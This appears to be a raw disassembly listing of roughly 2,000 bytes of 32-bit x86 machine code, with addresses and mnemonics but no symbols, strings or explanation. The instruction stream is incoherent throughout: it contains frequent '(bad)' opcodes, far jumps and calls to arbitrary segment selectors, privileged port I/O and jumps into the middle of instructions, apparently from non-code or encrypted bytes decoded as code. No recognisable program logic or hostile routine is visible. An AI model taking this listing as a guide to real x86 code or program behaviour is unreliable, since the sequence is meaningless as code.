  414732:	jmp    0x41478f
  414734:	mov    dl,0xa5
  414736:	cmc    
  414737:	push   edi
  414738:	call   0xd2f8:0x41a43abe
  41473f:	imul   eax,edx,0x15
  414742:	int3   
  414743:	ret    
  414744:	ror    DWORD PTR [edi+edi*8-0xe3da62d],cl
  41474b:	lea    esp,[si+0x3f2]
  414750:	je     0x41476c
  414752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414753:	call   0xa9118edb
  414758:	ja     0x414799
  41475a:	scas   al,BYTE PTR es:[edi]
  41475b:	xchg   ebx,eax
  41475c:	fbstp  TBYTE PTR [edi-0x7a]
  41475f:	(bad)  
  414761:	pop    ds
  414762:	fidiv  WORD PTR [eax]
  414764:	lahf   
  414765:	xchg   ebp,eax
  414766:	aam    0xc4
  414768:	cdq    
  414769:	(bad)  
  41476b:	jnp    0x4147b1
  41476d:	jb     0x4147d5
  41476f:	(bad)  
  414770:	pop    esp
  414771:	sbb    ah,BYTE PTR [ecx+esi*1]
  414774:	retf   
  414775:	pop    esi
  414776:	mov    eax,0x4932adbb
  41477b:	leave  
  41477c:	test   eax,0xf7323ca3
  414781:	stc    
  414782:	cmp    esp,ecx
  414784:	pop    ds
  414785:	imul   BYTE PTR [esi+0xcb97c90]
  41478b:	or     eax,0x79f9a02d
  414790:	pop    ebp
  414791:	push   ss
  414792:	jno    0x414773
  414794:	cli    
  414795:	aam    0x11
  414797:	dec    edi
  414798:	push   ebx
  414799:	push   es
  41479a:	cwde   
  41479b:	pop    ss
  41479c:	inc    ebp
  41479d:	in     eax,dx
  41479e:	mov    DWORD PTR [eax],eax
  4147a0:	rcl    BYTE PTR [ebx-0x568af0cc],cl
  4147a6:	inc    esp
  4147a7:	xchg   BYTE PTR [ecx+0x23],dh
  4147aa:	push   0xffffffe3
  4147ac:	and    BYTE PTR [esi+0x66c2857f],cl
  4147b2:	call   0x7b97c970
  4147b7:	or     eax,0xaee5d2f1
  4147bc:	clc    
  4147bd:	xor    DWORD PTR [esi],0x12547397
  4147c3:	cli    
  4147c4:	clc    
  4147c5:	push   ecx
  4147c6:	mov    BYTE PTR [ebx+eax*2],ch
  4147c9:	in     al,dx
  4147ca:	lods   eax,DWORD PTR ds:[esi]
  4147cb:	mov    ds:0x5c9ba158,al
  4147d0:	push   es
  4147d1:	push   cs
  4147d2:	pop    es
  4147d3:	pop    eax
  4147d4:	mov    ebx,0x399804c4
  4147d9:	rol    DWORD PTR ds:0x64d234a2,0xdc
  4147e0:	or     al,0x75
  4147e2:	xchg   esp,eax
  4147e3:	add    al,BYTE PTR [ecx-0x566dceef]
  4147e9:	popf   
  4147ea:	add    al,0xb2
  4147ec:	cli    
  4147ed:	sbb    bh,dl
  4147ef:	mov    al,0x86
  4147f1:	sub    esp,ebp
  4147f3:	cmp    BYTE PTR [edx+esi*4],0x7d
  4147f7:	inc    DWORD PTR ss:[esi-0x4f]
  4147fb:	stc    
  4147fc:	xor    al,0x58
  4147fe:	or     ch,BYTE PTR [ebp-0x3d96a228]
  414804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414805:	sbb    ah,BYTE PTR [ecx]
  414807:	repnz outs dx,BYTE PTR ds:[esi]
  414809:	imul   ebp,DWORD PTR [ecx+0x4a1fedad],0xb
  414810:	ret    
  414811:	lock or BYTE PTR [ebx+0x53],bh
  414815:	xchg   esp,eax
  414816:	xchg   esp,eax
  414817:	mov    ecx,0x6e19b0e4
  41481c:	and    eax,DWORD PTR [ecx-0x16]
  41481f:	sbb    eax,0x2bbe2383
  414824:	ins    BYTE PTR es:[edi],dx
  414825:	cmp    al,0x1
  414827:	cmp    edi,DWORD PTR [edx+0x65062fad]
  41482d:	call   0x591c6914
  414832:	sub    al,0x7c
  414834:	push   es
  414835:	jbe    0x4147da
  414837:	nop
  414838:	test   eax,0x3897fbb4
  41483d:	and    al,0xac
  41483f:	data16 cmp ah,BYTE PTR [esi+edi*8-0x299fbe8c]
  414847:	mov    ds:0x8356e90b,al
  41484c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41484d:	mov    ebx,0x599c8155
  414852:	and    ebx,DWORD PTR [edx+0x53]
  414855:	xor    edi,edx
  414857:	neg    BYTE PTR [esi+0x31a6e951]
  41485d:	pop    edx
  41485e:	je     0x414883
  414860:	pop    ebx
  414861:	sub    BYTE PTR [edi],al
  414863:	fisub  DWORD PTR [eax-0x6a2c8ad2]
  414869:	retf   
  41486a:	xor    BYTE PTR [edx-0x40084f6d],ch
  414870:	fcomip st,st(4)
  414872:	and    DWORD PTR [ebx],edi
  414874:	out    0x66,eax
  414876:	pop    ecx
  414877:	lods   eax,DWORD PTR ds:[esi]
  414878:	xor    eax,0x5afed02b
  41487d:	add    eax,0x3aefcef8
  414882:	outs   dx,DWORD PTR ds:[esi]
  414883:	pushf  
  414884:	xchg   esp,eax
  414885:	pop    eax
  414886:	xor    eax,0xded8bb1b
  41488b:	jmp    0xf1bf:0x53334dc6
  414892:	add    eax,0x594769ea
  414897:	dec    eax
  414898:	jecxz  0x414834
  41489a:	push   ebp
  41489b:	cwde   
  41489c:	lds    esi,FWORD PTR [edx-0x28fbeb2a]
  4148a2:	cli    
  4148a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a4:	jle    0x4148d5
  4148a6:	outs   dx,BYTE PTR ds:[esi]
  4148a7:	sti    
  4148a8:	push   0xffffffad
  4148aa:	mov    bl,0x8f
  4148ac:	mov    al,ds:0xeac8c039
  4148b1:	add    BYTE PTR [ebp+0x74],bl
  4148b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148b5:	dec    esp
  4148b6:	(bad)  
  4148b7:	pop    ecx
  4148b8:	ja     0x41489c
  4148ba:	cmp    al,BYTE PTR [esi-0xa]
  4148bd:	retf   0xfee5
  4148c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c1:	test   eax,0x36ad249a
  4148c6:	pop    ecx
  4148c7:	mov    esp,0x5ebf9849
  4148cc:	shl    BYTE PTR [ecx+0x1a],1
  4148cf:	(bad)  
  4148d0:	frstor [ecx-0x16da37f0]
  4148d6:	adc    al,0x34
  4148d8:	ror    DWORD PTR [eax+ecx*8+0x62],1
  4148dc:	fwait
  4148dd:	aad    0xca
  4148df:	xchg   edx,eax
  4148e0:	pushf  
  4148e1:	mov    ah,0xfb
  4148e3:	inc    edi
  4148e4:	dec    esp
  4148e5:	pop    edi
  4148e6:	dec    edi
  4148e7:	push   ecx
  4148e8:	jne    0x41486d
  4148ea:	mov    ecx,DWORD PTR gs:[ebx]
  4148ed:	mov    ds:0x1510f84,eax
  4148f2:	sub    ch,BYTE PTR [esi-0x3f]
  4148f5:	pop    esi
  4148f6:	fs jne 0x414932
  4148f9:	ret    0xc650
  4148fc:	imul   edx,esi,0xffffff91
  4148ff:	in     eax,0x4b
  414901:	int3   
  414902:	jb     0x4148a2
  414904:	xchg   ebp,eax
  414905:	lods   eax,DWORD PTR ds:[esi]
  414906:	retf   
  414907:	rcl    DWORD PTR [edx+0x6c],cl
  41490a:	shl    BYTE PTR [edx+ebx*1],cl
  41490d:	rol    edi,0x7f
  414910:	or     dl,BYTE PTR [ebp+0x46]
  414913:	jp     0x4148cf
  414915:	sub    eax,0x5dc992e9
  41491a:	push   edi
  41491b:	pushf  
  41491c:	push   esp
  41491d:	stc    
  41491e:	in     eax,dx
  41491f:	call   0xccfdb0d
  414924:	jae    0x4148fc
  414926:	xchg   ebp,eax
  414927:	retf   
  414928:	pop    ss
  414929:	fsubr  DWORD PTR [eax-0x1d]
  41492c:	popa   
  41492d:	icebp  
  41492e:	fsub   st,st(1)
  414930:	mov    ebp,DWORD PTR [eax-0x43d9e00b]
  414936:	aas    
  414937:	and    cl,ch
  414939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493a:	pop    esp
  41493b:	xor    ch,BYTE PTR [edx+0x6f]
  41493e:	or     ebx,ebx
  414940:	aad    0x81
  414942:	dec    ebx
  414943:	aad    0xcd
  414945:	push   0xfffffffb
  414947:	add    bh,BYTE PTR [eax+0x5d7d9806]
  41494d:	jmp    0x41491b
  41494f:	push   ebp
  414950:	adc    BYTE PTR [edx],0xd8
  414953:	daa    
  414954:	jo     0x414908
  414956:	pop    ecx
  414957:	jmp    0x4148f5
  414959:	dec    DWORD PTR [ebp+0x31c2c509]
  41495f:	xchg   BYTE PTR [edx+0x3d],dl
  414962:	hlt    
  414963:	mov    ebx,0x23c4c5d
  414968:	push   esi
  414969:	mov    dh,0xc7
  41496b:	xchg   ecx,eax
  41496c:	ror    bl,cl
  41496e:	sahf   
  41496f:	das    
  414970:	or     dh,BYTE PTR [edi+0x69]
  414973:	fdivr  st,st(6)
  414975:	xchg   esi,eax
  414976:	jecxz  0x414989
  414978:	mov    dh,0xd9
  41497a:	out    dx,al
  41497b:	jne    0x414928
  41497d:	jne    0x414972
  41497f:	cmp    al,0x81
  414981:	pop    esi
  414982:	fistp  DWORD PTR [ebp-0x23]
  414985:	mov    bl,0x8f
  414987:	xchg   DWORD PTR [edi+0x4f],ebp
  41498a:	mov    ebp,0xee9394d4
  41498f:	mov    dh,0x13
  414991:	cmp    BYTE PTR [edx+ebx*1+0x51],dl
  414995:	jmp    0x41499e
  414997:	test   BYTE PTR [ecx-0x5ccb02b5],0x6f
  41499e:	jmp    0x4bbc:0xb0f45336
  4149a5:	adc    eax,0x7badf364
  4149aa:	in     eax,dx
  4149ab:	add    eax,0xa8cf53ef
  4149b0:	ja     0x41499c
  4149b2:	jo     0x4149a1
  4149b4:	or     BYTE PTR [esi+0x35425047],bl
  4149ba:	cdq    
  4149bb:	xor    edi,ebp
  4149bd:	imul   ebx,DWORD PTR [edx-0x46378fee],0x10
  4149c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c5:	xchg   DWORD PTR [ebp+0x63618c46],esp
  4149cb:	jl     0x4149b3
  4149cd:	adc    DWORD PTR [edx+0x6c512dcd],ecx
  4149d3:	(bad)  
  4149d4:	inc    esp
  4149d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149d6:	jge    0x414960
  4149d8:	retf   
  4149d9:	aad    0xa5
  4149db:	fld    TBYTE PTR [edi]
  4149dd:	popf   
  4149de:	sbb    cl,BYTE PTR [esi+0x4d]
  4149e1:	jmp    0x414a44
  4149e3:	je     0x4149f8
  4149e5:	xor    eax,0x64bb03a8
  4149ea:	mov    al,ds:0x334e5db7
  4149ef:	cdq    
  4149f0:	(bad)  
  4149f1:	mov    edi,0x66a4ca9a
  4149f6:	jnp    0x4149dd
  4149f8:	mov    al,ds:0x5a1434d5
  4149fd:	das    
  4149fe:	mov    ecx,0x7f600df6
  414a03:	and    al,ch
  414a05:	xor    cl,BYTE PTR [ebx+esi*4]
  414a08:	pop    esp
  414a09:	rol    DWORD PTR [eax-0x13a18951],0xc4
  414a10:	sbb    bh,ch
  414a12:	enter  0x7eeb,0x1f
  414a16:	lock sub al,BYTE PTR [edi*4-0x351dafa8]
  414a1e:	test   al,0x7
  414a20:	cmp    DWORD PTR [edi],esp
  414a22:	fstp   QWORD PTR ds:0x904cca64
  414a28:	mov    al,0x63
  414a2a:	out    dx,eax
  414a2b:	xchg   BYTE PTR [ebx-0xe],cl
  414a2e:	and    edx,DWORD PTR [esp+edx*1+0x3e]
  414a32:	push   ds
  414a33:	and    BYTE PTR [eax-0x35],bl
  414a36:	fdiv   st,st(2)
  414a38:	mov    ds:0x1d4e63b9,eax
  414a3d:	jne    0x414a40
  414a3f:	lock xor eax,0x76dddc74
  414a45:	cmc    
  414a46:	push   ss
  414a47:	adc    eax,0xe7b6bafb
  414a4c:	stos   DWORD PTR es:[edi],eax
  414a4d:	out    0x76,al
  414a4f:	leave  
  414a50:	jle    0x414a63
  414a52:	mov    al,ds:0x932656fe
  414a57:	or     edi,DWORD PTR [edx-0x36]
  414a5a:	inc    esi
  414a5b:	inc    ebp
  414a5c:	loop   0x414a74
  414a5e:	push   esi
  414a5f:	in     eax,0xc9
  414a61:	dec    ebp
  414a62:	int    0xed
  414a64:	push   esi
  414a65:	mov    cl,ch
  414a67:	loopne 0x414ae6
  414a69:	pop    ss
  414a6a:	jle    0x414a07
  414a6c:	fsubrp st(4),st
  414a6e:	xor    bl,al
  414a70:	test   eax,0x872cd7fc
  414a75:	mov    DWORD PTR [esi+esi*1+0xdc73c7b],esi
  414a7c:	shr    DWORD PTR [ebp+0x56e911af],1
  414a82:	sub    edi,eax
  414a84:	sub    al,0xb9
  414a86:	cmp    ecx,DWORD PTR [edx+0x76]
  414a89:	jecxz  0x414af6
  414a8b:	outs   dx,DWORD PTR ds:[esi]
  414a8c:	mov    dh,0x2d
  414a8e:	daa    
  414a8f:	ins    DWORD PTR es:[edi],dx
  414a90:	add    esi,DWORD PTR ds:0xdcc17b84
  414a96:	lahf   
  414a97:	sub    eax,0xbf845344
  414a9c:	jns    0x414a1e
  414a9e:	dec    edx
  414aa0:	adc    DWORD PTR [edx],edi
  414aa2:	push   ecx
  414aa3:	outs   dx,BYTE PTR ds:[esi]
  414aa4:	mov    bh,0x5d
  414aa6:	mov    ebp,ss
  414aa8:	mov    edi,DWORD PTR [ecx+0x7e4d51e5]
  414aae:	jne    0x414a72
  414ab0:	out    dx,eax
  414ab1:	arpl   WORD PTR [esi-0x1d],ax
  414ab4:	add    eax,0xe8009b5a
  414ab9:	push   ebx
  414aba:	jg     0x414acc
  414abc:	out    0x1a,eax
  414abe:	jmp    0x855f2e6f
  414ac3:	hlt    
  414ac4:	pop    ebx
  414ac5:	test   eax,0xf1969842
  414aca:	cmp    dh,BYTE PTR [ebx]
  414acc:	jge    0x414b03
  414ace:	cmp    al,0x34
  414ad0:	fptan  
  414ad2:	fs dec edi
  414ad4:	call   0x38ad48cd
  414ad9:	cmp    eax,0xe76b89e7
  414ade:	mov    edx,0xd457c9c6
  414ae3:	pop    es
  414ae4:	xchg   edx,eax
  414ae5:	mov    esp,0x42d5b77b
  414aea:	cmp    bl,bl
  414aec:	xchg   edx,eax
  414aed:	pop    edi
  414aee:	dec    ecx
  414aef:	gs xchg esp,eax
  414af1:	stc    
  414af2:	pop    edi
  414af3:	xor    DWORD PTR [ecx+0x43d612fb],edx
  414af9:	and    esp,DWORD PTR [esi-0x13]
  414afc:	xor    DWORD PTR [ebx],esi
  414afe:	xchg   edx,eax
  414aff:	retf   
  414b00:	shr    DWORD PTR [edi],0x26
  414b03:	dec    ecx
  414b04:	imul   esi,DWORD PTR [ebx],0x68
  414b07:	push   cs
  414b08:	push   ss
  414b09:	mov    edi,0x5a23f61a
  414b0e:	(bad)  
  414b0f:	dec    ecx
  414b10:	in     al,0xa7
  414b12:	in     eax,0x19
  414b14:	mov    dh,0xa0
  414b16:	add    bh,BYTE PTR [esi]
  414b18:	mov    ds:0x29f2588f,al
  414b1d:	ret    0xcb1e
  414b20:	popf   
  414b21:	imul   ebp,DWORD PTR [eax-0x5a],0x44
  414b25:	push   cs
  414b26:	mov    al,0xac
  414b28:	mov    ch,0x5c
  414b2b:	mov    ebx,0x794d0efc
  414b30:	pop    edi
  414b31:	sub    BYTE PTR [edx],dh
  414b33:	sub    al,0x60
  414b35:	sub    DWORD PTR [esi+0x6f],esi
  414b38:	retf   0x9481
  414b3b:	mov    ds:0xb498f4d0,eax
  414b40:	das    
  414b41:	inc    ecx
  414b42:	nop
  414b43:	out    0x9d,eax
  414b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b46:	pop    ecx
  414b47:	inc    ebx
  414b48:	cli    
  414b49:	push   esi
  414b4a:	shr    ecx,0x17
  414b4d:	add    eax,0x15d05485
  414b52:	mov    ds:0xa930afeb,eax
  414b57:	loopne 0x414b99
  414b59:	retf   
  414b5a:	imul   ebp,DWORD PTR [eax-0x48],0xbbdcd2c7
  414b61:	add    BYTE PTR [ebx-0xe1cc6d6],dh
  414b67:	dec    ecx
  414b68:	sbb    eax,0x1a56b412
  414b6d:	retf   0x1c08
  414b70:	sahf   
  414b71:	stc    
  414b72:	fisttp WORD PTR [esi]
  414b74:	jae    0x414b66
  414b76:	push   esi
  414b77:	or     al,0x93
  414b79:	and    al,0xf6
  414b7b:	or     DWORD PTR [edi],0xffffff80
  414b7e:	mov    dh,0x78
  414b80:	jae    0x414b4d
  414b82:	dec    edx
  414b83:	sbb    al,bh
  414b85:	jno    0x414b11
  414b87:	cmp    eax,DWORD PTR [edx+0x8ce0dff]
  414b8d:	mov    BYTE PTR [ebx+0x6a3757c3],bl
  414b93:	test   al,0x3b
  414b95:	(bad)  
  414b97:	fs add al,0x9a
  414b9a:	push   ss
  414b9b:	hlt    
  414b9c:	aaa    
  414b9d:	lds    edx,FWORD PTR [edx]
  414b9f:	mov    ebx,0xca14c79c
  414ba4:	loop   0x414b57
  414ba6:	inc    ebp
  414ba7:	sti    
  414ba8:	ins    DWORD PTR es:[edi],dx
  414ba9:	mov    dh,0x40
  414bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bac:	adc    DWORD PTR [eax-0x7a17ed27],0x3c
  414bb3:	xor    edi,DWORD PTR [esi]
  414bb5:	int3   
  414bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bb7:	test   eax,0xeab0b83d
  414bbc:	(bad)  
  414bbd:	add    dh,BYTE PTR cs:[esi+0x79]
  414bc1:	sbb    al,0x7b
  414bc3:	xchg   edx,eax
  414bc4:	mov    ebx,edi
  414bc6:	leave  
  414bc7:	stos   DWORD PTR es:[edi],eax
  414bc8:	pop    esi
  414bc9:	mov    BYTE PTR [edi-0xe],ah
  414bcc:	int3   
  414bcd:	test   eax,0x13189dce
  414bd2:	and    BYTE PTR [ebx-0x4f],al
  414bd5:	sub    al,0x69
  414bd7:	inc    ebx
  414bd8:	cs jb  0x414c0c
  414bdb:	icebp  
  414bdc:	sbb    eax,0xc4c27523
  414be1:	mov    al,0x8b
  414be3:	loopne 0x414bcb
  414be5:	mov    WORD PTR [edi],gs
  414be7:	and    al,0xaf
  414be9:	stos   BYTE PTR es:[edi],al
  414bea:	inc    ebx
  414beb:	fisttp WORD PTR [bp+si]
  414bee:	or     esp,0x7d
  414bf1:	xor    al,0x2c
  414bf3:	dec    ebp
  414bf4:	pop    esi
  414bf5:	pop    esi
  414bf6:	cmp    eax,0xae183a75
  414bfb:	and    eax,0x72b0371c
  414c00:	xchg   esi,eax
  414c01:	mul    DWORD PTR [ebx+0x52]
  414c04:	mov    esi,0x7a788d22
  414c09:	loope  0x414c48
  414c0b:	js     0x414b99
  414c0d:	test   ecx,eax
  414c0f:	aam    0xdd
  414c11:	(bad)  
  414c12:	cmp    ebp,esp
  414c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c15:	clc    
  414c16:	test   DWORD PTR [esi-0x4de5d997],ecx
  414c1c:	xchg   DWORD PTR [ecx],eax
  414c1e:	sahf   
  414c1f:	xchg   ebx,eax
  414c20:	dec    ecx
  414c21:	or     DWORD PTR [edx+0x32],ecx
  414c24:	repnz inc edi
  414c26:	cmc    
  414c27:	xchg   bp,ax
  414c29:	arpl   si,cx
  414c2b:	cmp    eax,0xf832cec0
  414c30:	ss scas eax,DWORD PTR es:[edi]
  414c32:	inc    edx
  414c33:	mov    eax,0x90ad9fc5
  414c38:	fwait
  414c39:	add    ebp,ecx
  414c3b:	or     DWORD PTR [edi+0xfd7b974],ebx
  414c41:	imul   esi,DWORD PTR [edi+0x4f0c2f79],0x17
  414c48:	dec    eax
  414c49:	mov    BYTE PTR [edi],0x2
  414c4c:	cld    
  414c4d:	pop    edi
  414c4e:	mov    ebx,0x1634f27f
  414c53:	inc    esi
  414c54:	jmp    0x11f1:0x69cf0882
  414c5b:	push   edi
  414c5c:	add    ecx,DWORD PTR [eax+esi*1]
  414c5f:	les    ecx,FWORD PTR [esi]
  414c61:	adc    BYTE PTR [ebx],bl
  414c63:	dec    ebx
  414c64:	enter  0x41f9,0x7e
  414c68:	xlat   BYTE PTR ds:[ebx]
  414c69:	pop    ebx
  414c6a:	(bad)  
  414c6b:	nop
  414c6c:	in     eax,0xb9
  414c6e:	jge    0x414c1b
  414c70:	bnd ret 
  414c72:	dec    edx
  414c73:	or     ecx,ebp
  414c75:	iret   
  414c76:	pop    ecx
  414c77:	or     DWORD PTR [edi+0x10],edx
  414c7a:	retf   0x39f8
  414c7d:	fcom   DWORD PTR [ebx-0x5a]
  414c80:	sbb    dh,BYTE PTR [ebp+0x67]
  414c83:	adc    al,0x34
  414c85:	and    DWORD PTR ds:0x1e9b773,esi
  414c8b:	aaa    
  414c8c:	(bad)  
  414c8d:	loop   0x414c61
  414c8f:	mov    al,BYTE PTR ds:[edi+ebx*8+0x2deb1fc1]
  414c97:	xchg   edi,eax
  414c98:	std    
  414c99:	mov    ch,0xb7
  414c9b:	loope  0x414c50
  414c9d:	xor    al,0x42
  414c9f:	xchg   ecx,eax
  414ca0:	fld    st(3)
  414ca2:	jl     0x414c98
  414ca4:	adc    ebx,DWORD PTR [ebx+0x8]
  414ca7:	mov    esp,0x40cb647b
  414cac:	mov    dl,0x55
  414cae:	push   0x6c97e18
  414cb3:	cmc    
  414cb4:	enter  0x2d7a,0xab
  414cb8:	sar    BYTE PTR [ebx-0x6626e750],0xae
  414cbf:	(bad)  
  414cc0:	aad    0x12
  414cc2:	mov    al,ds:0x3a97a6e7
  414cc7:	ja     0x414c57
  414cc9:	pop    ebp
  414cca:	add    ah,bh
  414ccc:	adc    al,0x7
  414cce:	push   edi
  414ccf:	push   esi
  414cd0:	jge    0x414d27
  414cd2:	je     0x414c68
  414cd4:	in     al,0x9a
  414cd6:	into   
  414cd7:	mov    dl,0x6
  414cd9:	shl    DWORD PTR [ebx+eiz*2],cl
  414cdc:	mov    eax,0x12e387bd
  414ce1:	popf   
  414ce2:	call   0x256e:0x9790cae8
  414ce9:	mov    eax,0xf80136e8
  414cee:	cwde   
  414cef:	mov    ebx,0x5ed65ceb
  414cf4:	push   0x79
  414cf6:	jge    0x414cdf
  414cf8:	add    edi,DWORD PTR [esi+edi*4-0x680df0a6]
  414cff:	dec    ebp
  414d00:	jmp    0xdf0e:0xabdafe58
  414d07:	dec    edi
  414d08:	mov    bl,0xe3
  414d0a:	in     eax,dx
  414d0b:	dec    edi
  414d0c:	add    eax,0x8be4f6f0
  414d11:	inc    edx
  414d12:	dec    ecx
  414d13:	loop   0x414d28
  414d15:	jg     0x414d66
  414d17:	int3   
  414d18:	inc    edi
  414d19:	cmp    ebx,ecx
  414d1b:	loop   0x414ce6
  414d1d:	pop    es
  414d1e:	jo     0x414d52
  414d20:	mov    eax,DWORD PTR [eax-0x6f292725]
  414d26:	inc    ebx
  414d27:	in     eax,0x5
  414d29:	call   DWORD PTR [esi]
  414d2b:	aam    0xe5
  414d2d:	xchg   ebx,eax
  414d2e:	(bad)  
  414d2f:	in     eax,0x9d
  414d31:	jmp    0xdc62a8e5
  414d36:	xor    bh,cl
  414d38:	rcr    DWORD PTR [esp+edx*4+0x55],0xf1
  414d3d:	xchg   ecx,eax
  414d3e:	mov    bh,0xfc
  414d40:	push   ds
  414d41:	std    
  414d42:	lds    esi,FWORD PTR [edx+edi*1+0x51]
  414d46:	cmp    ebx,DWORD PTR [esi-0x75]
  414d49:	arpl   si,si
  414d4b:	add    BYTE PTR [edi-0x28],ah
  414d4e:	pop    eax
  414d4f:	sub    esi,edx
  414d51:	test   ch,cl
  414d53:	pop    esi
  414d54:	inc    edi
  414d55:	xchg   ecx,eax
  414d56:	jae    0x414d83
  414d58:	cli    
  414d59:	push   edx
  414d5a:	pop    ss
  414d5b:	(bad)
  414d5e:	lea    ebp,[eax+0x79]
  414d61:	sbb    BYTE PTR ds:[esi-0x15],dh
  414d65:	fcom   DWORD PTR [edx-0x2c9a4d08]
  414d6b:	jmp    0xaf0d15bd
  414d70:	pop    ebx
  414d71:	es add eax,0xc427b05c
  414d77:	or     ah,BYTE PTR [ebx]
  414d79:	loop   0x414ddb
  414d7b:	(bad)  
  414d7c:	popf   
  414d7d:	neg    DWORD PTR [esi-0x15569bb5]
  414d83:	push   edx
  414d84:	aam    0xd9
  414d86:	cmp    ebp,esi
  414d88:	push   ss
  414d89:	imul   edx,DWORD PTR [eax],0x54797cf
  414d8f:	pushf  
  414d90:	mov    dh,0x66
  414d92:	retf   
  414d93:	test   eax,0x2d5620fa
  414d98:	or     BYTE PTR ds:0x12efdbd5,0xe7
  414d9f:	js     0x414d5e
  414da1:	push   cs
  414da2:	xchg   edx,eax
  414da3:	stc    
  414da4:	int3   
  414da5:	xchg   DWORD PTR [ebp+0x35],edx
  414da8:	ret    0x91e4
  414dab:	ds into 
  414dad:	jge    0x414d46
  414daf:	gs cs or esi,ecx
  414db3:	cld    
  414db4:	sub    DWORD PTR [edi],edi
  414db6:	je     0x414db9
  414db8:	sub    BYTE PTR [esi],dl
  414dba:	leave  
  414dbb:	dec    edx
  414dbc:	mov    eax,ds:0xb8218f9e
  414dc1:	add    eax,0xa7083d8e
  414dc6:	mov    bl,0xcb
  414dc8:	adc    DWORD PTR [eax+0x33],eax
  414dcb:	jp     0x414ddf
  414dcd:	cmc    
  414dce:	push   esi
  414dcf:	fistp  WORD PTR [eax-0x47]
  414dd2:	aaa    
  414dd3:	daa    
  414dd4:	dec    ebp
  414dd5:	sbb    DWORD PTR [bp+di-0x1691],edi
  414dda:	mov    al,0x3f
  414ddc:	sbb    bl,BYTE PTR [edi+0x7422be56]
  414de2:	enter  0x6ee1,0x1d
  414de6:	cmp    ebx,DWORD PTR [edi+0x3ba0925f]
  414dec:	(bad)  
  414ded:	cmp    bl,BYTE PTR [eax-0x2b]
  414df0:	sub    BYTE PTR [edi-0x30],bh
  414df3:	mov    edx,0x48f1b1
  414df8:	mov    eax,0x5b3b8612
  414dfd:	pop    ds
  414dfe:	ret    0xb279
  414e01:	sbb    BYTE PTR [esi-0x16],dh
  414e04:	(bad)  
  414e05:	gs loope 0x414e30
  414e08:	or     DWORD PTR [esi+esi*4+0x610e8ed3],eax
  414e0f:	xor    eax,0x55284dfb
  414e14:	lods   al,BYTE PTR ds:[esi]
  414e15:	stos   BYTE PTR es:[edi],al
  414e16:	fwait
  414e17:	inc    edi
  414e18:	jmp    0x414e7b
  414e1a:	imul   edx,eax,0xa911483a
  414e20:	cmp    eax,0x1e7d4d30
  414e25:	jns    0x414e7b
  414e27:	cli    
  414e28:	rcl    DWORD PTR [edi],cl
  414e2a:	inc    eax
  414e2b:	push   ecx
  414e2c:	cwde   
  414e2d:	jecxz  0x414e4d
  414e2f:	pop    ebx
  414e30:	cmp    eax,0xf70abb12
  414e35:	dec    eax
  414e36:	dec    edx
  414e37:	sub    dh,cl
  414e39:	add    edx,DWORD PTR [eax-0x29ff18bf]
  414e3f:	xlat   BYTE PTR ds:[ebx]
  414e40:	aaa    
  414e41:	popf   
  414e42:	(bad)  
  414e44:	out    0x0,al
  414e46:	mov    bh,0xd9
  414e48:	dec    edx
  414e49:	es push esi
  414e4b:	hlt    
  414e4c:	dec    ebp
  414e4d:	bnd js 0x414ea9
  414e50:	fs xchg ecx,eax
  414e52:	dec    ebx
  414e53:	xchg   ecx,eax
  414e54:	in     eax,dx
  414e55:	push   ebx
  414e56:	xchg   ecx,eax
  414e57:	xor    al,0xfe
  414e59:	aam    0xd1
  414e5b:	jmp    0x414e0a
  414e5d:	adc    edi,DWORD PTR [ebp-0x45fad360]
  414e63:	in     al,0x74
  414e65:	jmp    0x3870:0x29cde750
  414e6c:	(bad)  
  414e6d:	push   DWORD PTR [edx+0xc]
  414e70:	mov    ah,0x9a
  414e72:	xor    DWORD PTR [edi],ebx
  414e74:	fldenv [eax]
  414e76:	adc    al,0x52
  414e78:	sbb    BYTE PTR [ebx+0x54],cl
  414e7b:	jb     0x414efa
  414e7d:	ja     0x414e4e
  414e7f:	shl    DWORD PTR [eax],cl
  414e81:	adc    al,0x6f
  414e83:	xchg   ebp,eax
  414e84:	adc    cl,BYTE PTR [edx+0x7db63029]
  414e8a:	sbb    al,0x42
  414e8c:	xchg   edx,eax
  414e8d:	les    ecx,FWORD PTR [ebx+0xd]
  414e90:	mov    WORD PTR [esi],es
  414e92:	pop    esi
  414e93:	xchg   esp,eax
  414e94:	inc    esp
  414e95:	jno    0x414ec8
  414e97:	adc    eax,0x2bedc36
  414e9c:	pop    edx
  414e9d:	jle    0x414ece
  414e9f:	mov    bl,0x96
  414ea1:	push   esi
  414ea2:	mov    fs,WORD PTR [ecx]
  414ea4:	push   edi
  414ea5:	shl    ecx,1
  414ea7:	dec    ebx
  414ea8:	in     eax,dx
  414ea9:	(bad)  
  414eaa:	mov    ebp,DWORD PTR [ebp+0x232239fe]
  414eb0:	je     0x414e3f
  414eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb3:	push   edx
  414eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb5:	inc    eax
  414eb6:	loop   0x414f21
  414eb8:	xor    ch,dl
  414eba:	add    eax,0xb4a7633c
  414ebf:	jns    0x414e52
  414ec1:	outs   dx,DWORD PTR ds:[esi]
  414ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec3:	out    0xdd,eax
  414ec5:	mov    eax,edi
  414ec7:	mul    BYTE PTR [ebx+ebx*8+0x558b86d8]
  414ece:	sbb    edi,DWORD PTR [edx]
  414ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed1:	fst    QWORD PTR [edi]
  414ed3:	std    
  414ed4:	sub    eax,DWORD PTR [ebp+0x29]
  414ed7:	ret    0x1c97
  414eda:	test   al,0x69
  414edc:	or     al,0xd1
